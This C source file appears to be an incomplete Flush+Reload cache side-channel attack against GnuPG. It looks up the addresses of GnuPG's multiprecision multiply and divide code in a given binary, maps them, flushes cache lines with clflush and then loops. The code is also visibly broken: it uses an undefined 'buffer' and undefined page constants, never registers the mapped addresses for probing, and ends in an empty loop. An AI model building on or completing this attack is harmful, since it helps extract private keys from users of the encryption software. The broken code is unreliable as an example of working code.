#include <stdint.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <symbol.h>
#include <fr.h>
#include <util.h>

char *monitor[] = {
  "mpih-mul.c:85",
  "mpih-mul.c:271",
  "mpih-div.c:356"
};

void usage(const char *prog) {
  fprintf(stderr, "Usage: %s <gpg-binary>\n", prog);
  exit(1);
}

int nmonitor = sizeof(monitor)/sizeof(monitor[0]);

int main(int ac, char **av) {
  char *binary = av[1];
  void **p = malloc(3*sizeof(void*));

  if (binary == NULL)
    usage(av[0]);

  fr_t fr = fr_prepare();
  for (int i = 0; i < nmonitor; i++) {
    uint64_t offset = sym_getsymboloffset(binary, monitor[i]);
    if (offset == ~0ULL) {
      fprintf(stderr, "Cannot find %s in %s\n", monitor[i], binary);
      exit(1);
    }
    p[i] = map_offset(binary, offset);
    printf("%s %p\n",monitor[i], p[i]);
  }


  for (int i = 0; i < NPAGES * PAGE_SIZE; i++){
    asm volatile ("clflush 0(%0)": : "r" (buffer + i):);
  }

  asm volatile("mfence");
  asm volatile("mfence");

  while(1){

  }

}
